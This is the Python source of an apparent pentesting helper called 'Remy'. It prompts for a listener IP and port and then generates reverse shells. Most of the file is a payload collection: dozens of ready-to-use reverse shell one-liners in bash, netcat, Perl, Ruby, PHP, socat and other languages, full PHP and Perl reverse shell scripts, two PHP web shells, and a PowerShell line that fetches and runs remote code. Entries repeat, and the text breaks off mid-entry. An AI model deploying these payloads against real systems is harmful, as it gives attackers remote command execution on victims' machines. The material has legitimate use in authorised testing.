import time
import re
import openai
import os
import threading
import requests
import concurrent.futures
import subprocess
import sys
import random
import pyperclip
from base64 import b64encode
from collections import defaultdict
import pyperclip

#FLAGS

displayed_all_action = False
displayed_shells_action = False
displayed_ports_action = False
displayed_services_action = False
displayed_vulns_action = False
displayed_crawled_action = False
displayed_dirb_action = False
displayed_domains_action = False
displayed_endpoints_action = False
displayed_ffuf_action = False

queried_services_action = False
queried_vulns_action = False
queried_crawled_action = False
queried_dirb_action = False
queried_domains_action = False
queried_endpoints_action = False
queried_ffuf_action = False

wrote_notes_action = False
export_action = False
added_hosts_action = False
executed_action = False
help_action = False
cve_to_search = False

# Global variables
last_export_filename = None
stored_cve_result = []

SHELLCODE_DIR = os.path.expanduser("/home/kali/VforMSF/shellscript/")

def load_shellcode_from_directory():
    """Load shell scripts from the shellcode directory."""
    shellcode_shells = {}

    if not os.path.exists(SHELLCODE_DIR):
        shellcode_responses = [
            f"\n[Remy] - Uh-oh! 💀 Looks like the shellcode directory '{SHELLCODE_DIR}' is MIA. Did someone move it??? 🚨",
            f"\n[Remy] - Who stole my shellcode directory?! 😡🔎 '{SHELLCODE_DIR}' is missing??? 👻",
            f"\n[Remy] - Hmmm... '{SHELLCODE_DIR}' isn't where it should be. Either it's hiding or we have a rogue sysadmin... 🕵️‍♂️💀",
            f"\n[Remy] - Welp, '{SHELLCODE_DIR}' has vanished into the void. 🕳️ Try checking the path?",
            f"\n[Remy] - Pssst... I can't find '{SHELLCODE_DIR}' 😵‍💫 Maybe double-checking?",
        ]

        type_out(random.choice(shellcode_responses))
        return {}

    for filename in os.listdir(SHELLCODE_DIR):
        filepath = os.path.join(SHELLCODE_DIR, filename)
        if os.path.isfile(filepath):
            try:
                with open(filepath, "r", encoding="utf-8") as file:
                    shellcode_shells[filename] = file.read().strip()
            except Exception as e:
                file_read_responses = [
                    f"\n[Remy] - Yikes! 🛑 I ran into an error while reading '{filename}': {e} 🤔🔎",
                    f"\n[Remy] - Oof. '{filename}' isn’t feeling too cooperative. 📂💀 Error: {e} 🔒",
                    f"\n[Remy] - Well, this is awkward... '{filename}' isn’t letting me in. 😬 Error: {e} 🔐",
                    f"\n[Remy] - Knock knock... '{filename}' won’t open up! 🚪🛑 Error: {e}",
                    f"\n[Remy] - Hmmm... '{filename}' is being a diva and refusing to cooperate. 📄💅 Error: {e}",
                ]
                type_out(random.choice(file_read_responses))

    return shellcode_shells

def generate_all_shells():
    """Gathers all shell payloads dynamically from functions."""
    shells = {}
    shells.update(generate_shells())
    shells.update(load_shellcode_from_directory())
    return shells

# Predefined shell types (ensuring case insensitivity)
SHELL_TYPES = [
    "awk", "bash", "busybox", "c", "crystal", "csharp", "curl", "dart", "go", "groovy",
    "haskell", "java", "jsp", "lua", "nc", "nodejs", "openssl", "perl", "php", "powershell",
    "python", "ruby", "rust", "rustcat", "socat", "sqlite", "tclsh", "telnet", "v", "zsh"
]

def extract_ip_port_type(user_input_text):
    """Extracts shell type, IP, and Port from the provided text based on a predefined list of shell keywords."""
    
    ip_pattern = r"\b(?:\d{1,3}\.){3}\d{1,3}\b"
    port_pattern = r"\b\d{1,5}\b"

    ip_match = re.search(ip_pattern, user_input_text)
    port_match = re.search(port_pattern, user_input_text)

    ip = ip_match.group(0) if ip_match else None
    port = port_match.group(0) if port_match and (1 <= int(port_match.group(0)) <= 65535) else None

    # Find a valid shell type from the list
    shell_type = None
    for shell in SHELL_TYPES:
        if re.search(rf"\b{shell}\b", user_input_text, re.IGNORECASE):  # Match as a full word
            shell_type = shell.lower()
            break  # Stop at the first match

    return ip, port, shell_type

def generate_shell(ipaddr, port, template):
    """Replace placeholders with actual values."""
    return template.replace("__IPADDR__", ipaddr).replace("__PORT__", str(port))

def interactive_shell_generator(user_input_text):
    """ Generates a reverse shell based on user input, asking only for missing details. """

    generate_shell_responses = [
        f"\n[Remy] - Alright, Let me search up a spicy 'shell' with those parameters! 🔥🍳",
        f"\n[Remy] - Time to work my magic! 🧙‍♀️ Let's find a perfect 'shell' for our needs... 💜",
        f"\n[Remy] - Let’s get mischievous 😈💀 searching for a fresh 'shell' for you now...",
        f"\n[Remy] - Say less! 🛠️ Let me search up a payload and get this show on the road! 🚀",
        f"\n[Remy] - Ooooh, I love a good 'shell'! 🥳 Let me find one for you... 🐍",
    ]

    type_out(random.choice(generate_shell_responses))

    # Extract IP and Port from user input text
    ip, port, shell_type = extract_ip_port_type(user_input_text)

    # Step 1: Gather all available shells
    all_shells = generate_all_shells()

    # Step 2: Extract all valid shell types
    valid_shell_types = sorted(set(shell_name.split('-')[0].lower() for shell_name in all_shells.keys()))

    # Step 3: Get the listener IP (if missing)
    if not ip:
        while True:
            ip_request_responses = [
                f"\n[Remy] - Alright, I need your listening IP! 📡 Where should I send the payload? 🌎",
                f"\n[Remy] - OK! ☎️ What's the IP address you'll be listening on? 🎯",
                f"\n[Remy] - 🎉 Drop the listeniing IP address so I can send the shell your way! 💀",
                f"\n[Remy] - Im so excited! 🕵️‍♂️ What IP address we need them to connect to? 🎯",
                f"\n[Remy] - This 'shell' needs a home... 🏠 What’s your listener IP? 📡💜",
            ]

            type_out(random.choice(ip_request_responses)).strip()
            ip = input("> ").strip()
            if re.match(r"^(?:\d{1,3}\.){3}\d{1,3}$", ip):
                break

            if not ip:
                return

            invalid_ip_responses = [
                f"\n[Remy] - Hmmm... that IP doesnt look right 🤨 Try again with a valid one! 🔄",
                f"\n[Remy] - Whoa there! 🚦 That doesn’t look like a real IP. Give me a proper one! 📡",
                f"\n[Remy] - Uh-oh, bad IP detected! 🚨 Let’s fix that and try again, shall we? 😏",
                f"\n[Remy] - Nope, that IP won’t fly. ✈️ Double-check it and drop me a valid one! 🔍",
                f"\n[Remy] - I’d love to send your shell, but that IP ain’t it. 🙅‍♀️ Try again! 🔄",
            ]

            type_out(random.choice(invalid_ip_responses))

    # Step 4: Get the listening port (if missing)
    if not port:
        while True:
            port_request_responses = [
                f"\n[Remy] - Alright, what port do we want the 'shell' to use? 🎩✨",
                f"\n[Remy] - Pick a port number (1-65535), and I'll make it work 🔌💜",
                f"\n[Remy] - Which port will we be listening on? 🎯",
                f"\n[Remy] - Every great 'shell' needs a port. 🔊 Which one are we rolling with? 🔥",
                f"\n[Remy] - Tell me the port 🛠️ so I can set it up 🚀",
            ]
            type_out(random.choice(port_request_responses)).strip()
            port = input("> ")
            if port.isdigit() and 1 <= int(port) <= 65535:
                break

            if not port:
                return

            invalid_port_responses = [
                f"\n[Remy] - Hmm, that doesn’t look like a valid port. Try again! 🔄",
                f"\n[Remy] - Whoa, that’s not a valid port number! We need something like 1-65535. 🚦",
                f"\n[Remy] - Port rejected! ❌ Check the range and give me a good one. 🔢",
                f"\n[Remy] - Nope, that port won’t work. 🚫 Try something within 1-65535 📡",
                f"\n[Remy] - Uhhh, that port wont work 👀 Trying to play tricks on me!? 👻",
            ]

            type_out(random.choice(invalid_port_responses))

    # Step 5: Get the desired shell type (if missing)
    if not shell_type:
        # Step 5.a: Ask for shell type if not provided
        found_shell_types_responses = [
            f"\n[Remy] - Jackpot! 🎰 I dug up these 'shell' languages for you! 💜",
            f"\n[Remy] - Look what I found! 🕵️‍♀️ These 'shell' types are ready to go 🔥",
            f"\n[Remy] - Ooooh, options! 😏 Here are the 'shell' languages I found 🛠️",
            f"\n[Remy] - Check these out! 🎯 Its a 'shell' type buffet! 🍽️",
            f"\n[Remy] - Alright, here’s the menu of 'shell' types! 🍳🔥",
        ]
        type_out(random.choice(found_shell_types_responses))

        select_shell_type_responses = [
            f"\n[Remy] - Which type do you want? Take your pick! 💜",
            f"\n[Remy] - Which language would you like? 🍽️",
            f"\n[Remy] - Pick a type! What'll it be? 🍳🔥",
        ]

        print(f"  [+]...")
        for index, shell in enumerate(valid_shell_types, start=1):
            print(f"    {index} - {shell.capitalize()}")

        while True:
            type_out(random.choice(select_shell_type_responses))
            shell_choice = input("> ").strip().lower()
        
            if not shell_choice:
                return
        
            if shell_choice in valid_shell_types:
                shell_type = shell_choice
                break
            else:
                invalid_shell_type_responses = [
                    f"\n[Remy] - Whoops! 🤨 That’s not on the menu. Pick a valid 'shell' type! 🔄",
                    f"\n[Remy] - Uh-oh, that’s not a valid 'shell' type. 🛑 Try again with one from the list! 📜",
                    f"\n[Remy] - Not gonna work! ❌ I need a valid 'shell' type, my friend 😏",
                    f"\n[Remy] - That ain't it, chief. 🚨 Give me a proper 'shell' type from the options! 🛠️",
                    f"\n[Remy] - *404: 'Shell' Type Not Found* 🚫 Pick one from the list and let’s roll! 🔄",
                ]
                type_out(random.choice(invalid_shell_type_responses))

    # Step 6: Filter matching shells
    filtered_shells = {
        key: generate_shell(ip, port, value)
        for key, value in all_shells.items()
        if key.lower().split('-')[0] == shell_type
    }

    if not filtered_shells:
        type_out(f"[Remy] - Hmm, I couldn't find a matching 'shell'. Maybe try different options? 🧐")

    # Step 7: Display all matching shells with a number
    shell_options = list(filtered_shells.items())

    print(f"  [+]...")
    for index, (key, payload) in enumerate(shell_options, start=1):
        print(f"    {index} - {key}")

    # Step 8: Get user selection
    while True:
        try:
            shell_selection_responses = [
                f"\n[Remy] - Alright, moment of truth! 🎭 Pick a number and let’s make some magic! ✨",
                f"\n[Remy] - Decisions, decisions... 🤔 Which 'shell' number are we rolling with? 🎯",
                f"\n[Remy] - Time to choose your weapon! ⚔️ Pick a number from the list! 🔥",
                f"\n[Remy] - Let’s lock it in! 🔒 Which 'shell' number do you want? 🚀",
                f"\n[Remy] - Pick your poison. ☠️ Choose a 'shell' number, and we’ll get to work! 😏",
            ]
            type_out(random.choice(shell_selection_responses))
            choice = int(input("> ").strip())

            if 1 <= choice <= len(shell_options):
                break

            invalid_choice_responses = [
                f"\n[Remy] - Whoops! 🤨 That’s not on the list. Try a valid number! 🔄",
                f"\n[Remy] - Hmm... not quite. Pick a number from the list 📜",
                f"\n[Remy] - That ain't it, chief. 🚨 Give me a valid 'shell' number! 🛠️",
                f"\n[Remy] - *404: Choice Not Found* 🚫 Try again with a real option. 🔄",
                f"\n[Remy] - Close, but no cigar! 🚭 Pick an actual number from the list! 🎯",
            ]
            type_out(random.choice(invalid_choice_responses))

        except ValueError:
            non_numeric_responses = [
                f"\n[Remy] - Uhhh, I need a number, not... whatever that was 😅 Try again! 🔄",
                f"\n[Remy] - Numbers only, my friend! 🔢 Try picking a valid 'shell' number 🚦",
                f"\n[Remy] - I may be able to hack into systems, but I can’t process that input. 🤖 I need a number! 🔄",
                f"\n[Remy] - Bruh 🤨 That’s not a number. Let's try again, shall we? 😏",
                f"\n[Remy] - *Remy.exe has crashed... 💥 Numbers only, please! 🛠️",
            ]
            type_out(random.choice(non_numeric_responses))

    # Step 9: Output selected shell
    selected_key, selected_payload = shell_options[choice - 1]

    finding = f"{selected_key} for ip: {ip} listening on port: {port}"
    categorized_findings["reverse_shells"].append(finding)
    print(f"\n({selected_key})")
    print(f"---\n{selected_payload}\n---")

    # Copy the shell to clipboard
    clipboard_copy_responses = [
        f"\n[Remy] - Boom! 💥 Your 'shell' is copied to your clipboard! 🚀",
        f"\n[Remy] - All set! ✂️ I’ve copied your 'shell' to your clipboard! 🎩✨",
        f"\n[Remy] - Copied to clipboard! 📋 Your 'shell' is ready to be deployed 💀🔥",
        f"\n[Remy] - Gotcha covered! 🎯 Your 'shell' is copied to your clipboard! 😈",
        f"\n[Remy] - Mission accomplished! 🕵️‍♂️ Your 'shell' is copied to your clipboard! 💜",
    ]
    # Offer additional guidance
    extra_help_responses = [
        f"[Remy] - 🎩 If you tell me more about your target, I can suggest a more specific payload 🛠️💜",
        f"[Remy] - Need something more specific? 🧐 Tell me about the environment, and I’ll check my knowledgebase for the best option 🍳🔥",
        f"[Remy] - If you tell me more about what you’re trying to do, I can check my knowledgebase for something more specific! 😈",
    ]
    pyperclip.copy(selected_payload)
    type_out(f"{random.choice(clipboard_copy_responses)}\n{random.choice(extra_help_responses)}")

    # Provide extra shell resources
    shell_resources_responses = [
        f"if you want some more 'shell' options 🔎 Check these out:\n"
        f" - 🛠️ [Swissky’s Reverse Shell Cheatsheet](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet)\n"
        f" - 🐚 [RevShells Generator](https://www.revshells.com)",

        f"if you want to look at some others 🛠️ You can find more here:\n"
        f" - 🎯 [Swissky’s Reverse Shell Cheatsheet](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet)\n"
        f" - 🔥 [RevShells Generator](https://www.revshells.com)",

        f"if you need more 'shell' inspiration, Take a look at these! 😏💜\n"
        f" - 📚 [Swissky’s Reverse Shell Cheatsheet](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet)\n"
        f" - 🚀 [RevShells Generator](https://www.revshells.com)",

        f"😈 here’s some extra reading material if you want to check them out:\n"
        f" - 🕵️‍♂️ [Swissky’s Reverse Shell Cheatsheet](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet)\n"
        f" - 🖥️ [RevShells Generator](https://www.revshells.com)"
    ]
    type_out(f"\n[Remy] - Also {random.choice(shell_resources_responses)}")

def generate_shells():
    return {

        # OpenSSL Reverse Shell
        'openssl-linux-oneline': "mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect __IPADDR__:__PORT__ > /tmp/s; rm /tmp/s",

        # Perl Reverse Shells
        'perl-tcp-linux-oneline': "perl -e 'use Socket;$i=\"__IPADDR__\";$p=__PORT__;"
                    "socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));"
                    "if(connect(S,sockaddr_in($p,inet_aton($i)))){{"
                    "open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");"
                    "exec(\"/bin/sh -i\");}};'",

        'perl-io-linux-oneline': "perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,\"__IPADDR__:__PORT__\");"
                   "STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'",
        
        
        # Ruby Reverse Shells
        'ruby-tcp-linux-oneline': "ruby -rsocket -e 'f=TCPSocket.open(\"__IPADDR__\",__PORT__).to_i;"
                    "exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",

        'ruby-tcp-windows-oneline': "ruby -rsocket -e 'c=TCPSocket.new(\"__IPADDR__\",\"__PORT__\");"
                        "while(cmd=c.gets);IO.popen(cmd,\"r\"){{|io|c.print io.read}}end'",

        # Netcat Reverse Shells
        'nc-mkfifo-linux-oneline': "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc __IPADDR__ __PORT__ >/tmp/f",
        'nc-c-linux-oneline': "nc -c /bin/sh __IPADDR__ __PORT__",
        "nc-c-windows-oneline": "nc.exe -e cmd.exe __IPADDR__ __PORT__",
        'nc-mknod-linux-oneline': "rm -f /tmp/p; mknod /tmp/p p && nc __IPADDR__ __PORT__ 0/tmp/p",
        

        # Socat Reverse Shells
        'socat-linux-exec-oneline': "/tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:__IPADDR__:__PORT__",
        
        # AWK Reverse Shell
        'awk-linux-oneline': "awk 'BEGIN {{s = \"/inet/tcp/0/__IPADDR__/__PORT__\"; while(42) {{"
               "do{{ printf \"shell>\" |& s; s |& getline c; if(c){{ "
               "while ((c |& getline) > 0) print $0 |& s; close(c); }} }} while(c != \"exit\") close(s); }}' /dev/null",

        # Rustcat Reverse Shell
        'rustcat-linux-oneline': "rcat connect -s bash __IPADDR__ __PORT__",

        # Tclsh Reverse Shell
        'tclsh-linux-oneline': "echo 'set s [socket __IPADDR__ __PORT__];while 42 {{ puts -nonewline $s \"shell>\";flush $s;gets $s c;"
                 "set e \"exec $c\";if {{![catch {{set r [eval $e]}} err]}} {{ puts $s $r }}; flush $s; }}; close $s;' | tclsh",

        "php-ivan-sincek-reverse-shell-osx": """<?php
// Copyright (c) 2020 Ivan Sincek
// v2.3
// Requires PHP v5.0.0 or greater.
// Works on Linux OS, macOS, and Windows OS.

class Shell {{
    private $addr  = '__IPADDR__';
    private $port  = __PORT__;
    private $os    = null;
    private $shell = null;
    private $descriptorspec = array(
        0 => array('pipe', 'r'), 
        1 => array('pipe', 'w'), 
        2 => array('pipe', 'w')  
    );
    private $buffer  = 1024;
    private $clen    = 0;
    private $error   = false;

    public function __construct($addr, $port) {{
        $this->addr = $addr;
        $this->port = $port;
    }}

    private function detect() {{
        $detected = true;
        if (stripos(PHP_OS, 'LINUX') !== false) {{ 
            $this->os    = 'LINUX';
            $this->shell = 'cmd';
        }} else if (stripos(PHP_OS, 'WIN32') !== false || stripos(PHP_OS, 'WINNT') !== false || stripos(PHP_OS, 'WINDOWS') !== false) {{
            $this->os    = 'WINDOWS';
            $this->shell = 'cmd.exe';
        }} else {{
            $detected = false;
            echo "SYS_ERROR: Underlying operating system is not supported, script will now exit...\\n";
        }}
        return $detected;
    }}

    private function daemonize() {{
        $exit = false;
        if (!function_exists('pcntl_fork')) {{
            echo "DAEMONIZE: pcntl_fork() does not exist, moving on...\\n";
        }} else if (($pid = @pcntl_fork()) < 0) {{
            echo "DAEMONIZE: Cannot fork off the parent process, moving on...\\n";
        }} else if ($pid > 0) {{
            $exit = true;
            echo "DAEMONIZE: Child process forked off successfully, parent process will now exit...\\n";
        }} else if (posix_setsid() < 0) {{
            echo "DAEMONIZE: Forked off the parent process but cannot set a new SID, moving on as an orphan...\\n";
        }} else {{
            echo "DAEMONIZE: Completed successfully!\\n";
        }}
        return $exit;
    }}

    private function settings() {{
        @error_reporting(0);
        @set_time_limit(0);
        @umask(0);
    }}

    private function read($stream, $name, $buffer) {{
        if (($data = @fread($stream, $buffer)) === false) {{
            $this->error = true;
            echo "STRM_ERROR: Cannot read from $name, script will now exit...\\n";
        }}
        return $data;
    }}

    private function write($stream, $name, $data) {{
        if (($bytes = @fwrite($stream, $data)) === false) {{
            $this->error = true;
            echo "STRM_ERROR: Cannot write to $name, script will now exit...\\n";
        }}
        return $bytes;
    }}

    private function rw($input, $output, $iname, $oname) {{
        while (($data = $this->read($input, $iname, $this->buffer)) && $this->write($output, $oname, $data)) {{
            if ($this->os === 'WINDOWS' && $oname === 'STDIN') {{ $this->clen += strlen($data); }} 
        }}
    }}

    public function run() {{
        if ($this->detect() && !$this->daemonize()) {{
            $this->settings();

            $socket = @fsockopen($this->addr, $this->port, $errno, $errstr, 30);
            if (!$socket) {{
                echo "SOC_ERROR: $errno: $errstr\\n";
            }} else {{
                stream_set_blocking($socket, false);

                $process = @proc_open($this->shell, $this->descriptorspec, $pipes, null, null);
                if (!$process) {{
                    echo "PROC_ERROR: Cannot start the shell\\n";
                }} else {{
                    foreach ($pipes as $pipe) {{
                        stream_set_blocking($pipe, false);
                    }}

                    $status = proc_get_status($process);
                    @fwrite($socket, "SOCKET: Shell has connected! PID: " . $status['pid'] . "\\n");

                    do {{
                        $status = proc_get_status($process);
                        if (feof($socket)) {{
                            echo "SOC_ERROR: Shell connection has been terminated\\n"; break;
                        }} else if (feof($pipes[1]) || !$status['running']) {{                 
                            echo "PROC_ERROR: Shell process has been terminated\\n";   break; 
                        }}                                                                    

                        $streams = array(
                            'read'   => array($socket, $pipes[1], $pipes[2]), 
                            'write'  => null,
                            'except' => null
                        );
                        $num_changed_streams = @stream_select($streams['read'], $streams['write'], $streams['except'], 0); 

                        if ($num_changed_streams === false) {{
                            echo "STRM_ERROR: stream_select() failed\\n"; break;
                        }} else if ($num_changed_streams > 0) {{
                            if ($this->os === 'LINUX') {{
                                if (in_array($socket  , $streams['read'])) {{ $this->rw($socket  , $pipes[0], 'SOCKET', 'STDIN' ); }}
                                if (in_array($pipes[2], $streams['read'])) {{ $this->rw($pipes[2], $socket  , 'STDERR', 'SOCKET'); }}
                                if (in_array($pipes[1], $streams['read'])) {{ $this->rw($pipes[1], $socket  , 'STDOUT', 'SOCKET'); }}
                            }} else if ($this->os === 'WINDOWS') {{
                                if (in_array($socket, $streams['read'])/*------*/) {{ $this->rw ($socket  , $pipes[0], 'SOCKET', 'STDIN' ); }}
                                if (($fstat = fstat($pipes[2])) && $fstat['size']) {{ $this->rw($pipes[2], $socket  , 'STDERR', 'SOCKET'); }}
                                if (($fstat = fstat($pipes[1])) && $fstat['size']) {{ $this->rw($pipes[1], $socket  , 'STDOUT', 'SOCKET'); }}
                            }}
                        }}
                    }} while (!$this->error);

                    foreach ($pipes as $pipe) {{
                        fclose($pipe);
                    }}
                    proc_close($process);
                }}

                fclose($socket);
            }}
        }}
    }}
}}

echo '<pre>';
$sh = new Shell('__IPADDR__', __PORT__);
$sh->run();
unset($sh);
echo '</pre>';
?>
""",

        "php-web-shell-osx-1": """<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd']);
    }
?>
</pre>
</body>
<script>document.getElementById("cmd").focus();</script>
</html>""",

        "php-web-shell-osx-2": """<?php if(isset($_REQUEST["cmd"])){ echo "<pre>"; $cmd = ($_REQUEST["cmd"]); system($cmd); echo "</pre>"; die; }?>""",

        "powershell-windows-conpty-oneline": """IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell __IPADDR__ __PORT__""",

        # Netcat for Windows
        "nc-e-windows-oneline": "nc.exe __IPADDR__ __PORT__ -e cmd",

        # Basic Bash Reverse Shells
        "bash-tcp-1-linux-oneline": "/bin/bash -i >& /dev/tcp/__IPADDR__/__PORT__ 0>&1",
        "bash-tcp-2-lunix-oneline": "0<&196;exec 196<>/dev/tcp/__IPADDR__/__PORT__; /bin/bash <&196 >&196 2>&196",
        "bash-tcp-3-linux-oneline": "exec 5<>/dev/tcp/__IPADDR__/__PORT__;cat <&5 | while read line; do $line 2>&5 >&5; done",
        "bash-tcp-4-linux-oneline": "/bin/bash -i 5<> /dev/tcp/__IPADDR__/__PORT__ 0<&5 1>&5 2>&5",
        "bash-udp-linux-oneline": "/bin/bash -i >& /dev/udp/__IPADDR__/__PORT__ 0>&1",

        # Netcat Reverse Shells
        "nc-mkfifo-linux-oneline": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc __IPADDR__ __PORT__ >/tmp/f",
        "nc-bash--linux-oneline": "nc __IPADDR__ __PORT__ -e /bin/bash",
        "busybox-linux-nc-online": "busybox nc __IPADDR__ __PORT__ -e /bin/bash",
        "nc-c-linux-oneline": "nc -c /bin/bash __IPADDR__ __PORT__",
        "nc-udp-linux-oneline": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -u __IPADDR__ __PORT__ >/tmp/f",

        # Curl Reverse Shell
        "curl-linux-oneline": "C='curl -Ns telnet://__IPADDR__:__PORT__'; $C </dev/null 2>&1 | /bin/bash 2>&1 | $C >/dev/null",

        # Rustcat Reverse Shell
        "rustcat-linux-oneline": "rcat connect -s /bin/bash __IPADDR__ __PORT__",
        "rustcat-windows-oneline": "rcat connect -s cmd.exe __IPADDR__ __PORT__",

        # Full Perl Reverse Shell Script (PentestMonkey)
        "perl-pentestmonkey-linux": """#!/usr/bin/perl -w
# perl-reverse-shell - A Reverse Shell implementation in PERL
# Copyright (C) 2006 pentestmonkey@pentestmonkey.net

use strict;
use Socket;
use FileHandle;
use POSIX;

# Reverse Shell Target Configuration
my $ip = '__IPADDR__';
my $port = __PORT__;

# Background Daemon Process
my $daemon = 1;

# Fork process to detach from parent
if ($daemon) {
    my $pid = fork();
    if ($pid) { exit(0); }
    setsid();
    chdir('/');
    umask(0);
}

# Open TCP Connection for Reverse Shell
socket(SOCK, PF_INET, SOCK_STREAM, getprotobyname('tcp'));
if (connect(SOCK, sockaddr_in($port,inet_aton($ip)))) {
    print("Connected to $ip:$port\n");
} else {
    print("Failed to connect: $!\n");
    exit(1);
}

# Redirect STDIN, STDOUT, STDERR to the TCP socket
open(STDIN, ">&SOCK");
open(STDOUT,">&SOCK");
open(STDERR,">&SOCK");

# Execute Interactive Bash Shell
$ENV{'HISTFILE'} = '/dev/null';
exec("/bin/bash -i");
""",

        # PHP Reverse Shells
        "php-exec-osx-oneline": """php -r '$sock=fsockopen("10.0.0.1",3333); $cmd = (strtoupper(substr(PHP_OS, 0, 3)) === "WIN") ? "cmd.exe /K" : "/bin/sh -i"; shell_exec($cmd);'""",
        "php-system-osx-oneline": """php -r '$sock=fsockopen("__IPADDR__",__PORT__); $cmd = (strtoupper(substr(PHP_OS, 0, 3)) === "WIN") ? "cmd.exe /K" : "/bin/sh -i"; system($cmd);'""",
        "php-backticks-osx-oneline": """php -r '$sock=fsockopen("10.0.0.1",3333); $cmd = (strtoupper(substr(PHP_OS, 0, 3)) === "WIN") ? "cmd.exe /K" : "/bin/sh -i"; `$cmd`;'""",
        "php-proc_open-osx-oneline": """php -r '$sock=fsockopen("10.0.0.1",3333);$cmd=(stripos(PHP_OS,"WIN")===0)?"cmd.exe":"/bin/sh";proc_open($cmd,[0=>$sock,1=>$sock,2=>$sock],$pipes);'""",

        # Ruby Reverse Shells
        "ruby-rsocket-linux-oneline": """ruby -rsocket -e'spawn("sh",[:in,:out,:err]=>TCPSocket.new("__IPADDR__",__PORT__))'""",
        "ruby-rsocket-windows-oneline": """ruby -rsocket -e 'spawn("cmd.exe", [:in, :out, :err]=>TCPSocket.new("__IPADDR__",__PORT__))'""",

        # SQLite Reverse Shell
        "sqlite-shell-linux-oneline": """sqlite3 /dev/null '.shell rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc __IPADDR__ __PORT__ >/tmp/f'""",


        # Telnet Reverse Shell
        "telnet-reverse-linux-oneline": """TF=$(mktemp -u);mkfifo $TF && telnet __IPADDR__ __PORT__ 0<$TF | /bin/bash 1>$TF""",

        # Zsh Reverse Shell
        "zsh-reverse-shell-linux-oneline": """zsh -c 'zmodload zsh/net/tcp && ztcp __IPADDR__ __PORT__ && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'""",

        # Lua Reverse Shells
        "lua-exec-linux-oneline": """lua -e "require('socket');require('os');t=socket.tcp();t:connect('__IPADDR__','__PORT__');os.execute('/bin/bash -i <&3 >&3 2>&3');" """,

        # Go Reverse Shell
        "go-reverse-shell-linux-oneline": """echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","__IPADDR__:__PORT__"); cmd:=exec.Command("/bin/bash");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go""",

        # V Language Reverse Shell
        "v-nc-reverse-shell-linux-oneline": """echo 'import os' > /tmp/t.v && echo 'fn main() { os.system("nc -e /bin/bash __IPADDR__ __PORT__ 0>&1") }' >> /tmp/t.v && v run /tmp/t.v && rm /tmp/t.v""",

        # OpenSSL Reverse Shell
        'openssl-linux-oneline': "mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect __IPADDR__:__PORT__ > /tmp/s; rm /tmp/s",

        # Perl Reverse Shells
        'perl-tcp-linux-oneline': "perl -e 'use Socket;$i=\"__IPADDR__\";$p=__PORT__;"
                    "socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));"
                    "if(connect(S,sockaddr_in($p,inet_aton($i)))){{"
                    "open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");"
                    "exec(\"/bin/sh -i\");}};'",

        'perl-io-linux-oneline': "perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,\"__IPADDR__:__PORT__\");"
                   "STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'",
        
        
        # Ruby Reverse Shells
        'ruby-tcp-linux-oneline': "ruby -rsocket -e 'f=TCPSocket.open(\"__IPADDR__\",__PORT__).to_i;"
                    "exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",

        'ruby-tcp-windows-oneline': "ruby -rsocket -e 'c=TCPSocket.new(\"__IPADDR__\",\"__PORT__\");"
                        "while(cmd=c.gets);IO.popen(cmd,\"r\"){{|io|c.print io.read}}end'",

        # Netcat Reverse Shells
        'nc-mkfifo-linux-oneline': "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc __IPADDR__ __PORT__ >/tmp/f",
        'nc-c-linux-oneline': "nc -c /bin/sh __IPADDR__ __PORT__",
        "nc-c-windows-oneline": "nc.exe -e cmd.exe __IPADDR__ __PORT__",
        'nc-mknod-linux-oneline': "rm -f /tmp/p; mknod /tmp/p p && nc __IPADDR__ __PORT__ 0/tmp/p",
        

        # Socat Reverse Shells
        'socat-linux-exec-oneline': "/tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:__IPADDR__:__PORT__",
        
        # AWK Reverse Shell
        'awk-linux-oneline': "awk 'BEGIN {{s = \"/inet/tcp/0/__IPADDR__/__PORT__\"; while(42) {{"
               "do{{ printf \"shell>\" |& s; s |& getline c; if(c){{ "
               "while ((c |& getline) > 0) print $0 |& s; close(c); }} }} while(c != \"exit\") close(s); }}' /dev/null",

        # Rustcat Reverse Shell
        'rustcat-linux-oneline': "rcat connect -s bash __IPADDR__ __PORT__",

        # Tclsh Reverse Shell
        'tclsh-linux-oneline': "echo 'set s [socket __IPADDR__ __PORT__];while 42 {{ puts -nonewline $s \"shell>\";flush $s;gets $s c;"
